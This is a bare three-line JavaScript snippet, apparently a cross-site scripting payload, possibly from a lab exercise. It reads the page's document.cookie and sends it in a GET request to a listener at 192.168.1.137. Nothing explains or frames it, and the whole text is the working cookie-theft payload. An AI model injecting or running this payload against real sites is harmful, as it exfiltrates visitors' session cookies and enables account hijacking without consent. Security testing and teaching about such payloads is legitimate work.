var request = new XMLHttpRequest();
request.open('GET','http://192.168.1.137/?cookie' + document.cookie);
request.send();
